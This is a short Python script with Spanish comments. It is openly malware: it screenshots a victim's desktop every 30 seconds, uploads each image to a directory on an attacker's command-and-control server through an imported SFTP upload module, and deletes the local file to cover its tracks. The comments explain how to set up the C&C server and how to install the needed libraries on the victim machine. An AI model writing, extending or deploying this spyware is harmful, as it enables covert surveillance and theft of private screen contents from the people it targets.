import datetime
import os, errno
import subirArchivo
import time
#En el server C&C se realiza lo mismo que en siguiente link:
#https://devtidbits.com/2011/06/29/implement-a-sftp-service-for-ubuntudebian-with-a-chrooted-isolated-file-directory/



#En el cliente se instala pip y el modulo de paramiko para ello hacer lo sig:
#Instalar install python-dev build-essential libcanberra-gtk3-module  -y 
#Bajar el script get-pip.py  del sitio: https://pip.pypa.io/en/stable/installing/
#Ejecutar ese script con python
#pip install pycrypto
#pip install paramiko


#Imprimiendo pantalla

def pantallazo():
    nomArchivo = datetime.datetime.now().strftime("%Y-%m-%d--%H:%M:%S")+".png"
    os.system("import -window root /tmp/"+nomArchivo)

    #Copiando el archivo al equipo atacante
    rutaAtacante = '/var/www/test_readwrite/'+nomArchivo
    rutaVictima = '/tmp/'+nomArchivo
    subirArchivo.subir(rutaAtacante,rutaVictima)

    #Eliminando el archivo en el equipo de la victima
    try:
	os.remove(rutaVictima)
    except OSError:
        pass

def pantallazoAutomatico():
    while True:
        pantallazo()
        time.sleep(30)

pantallazoAutomatico()
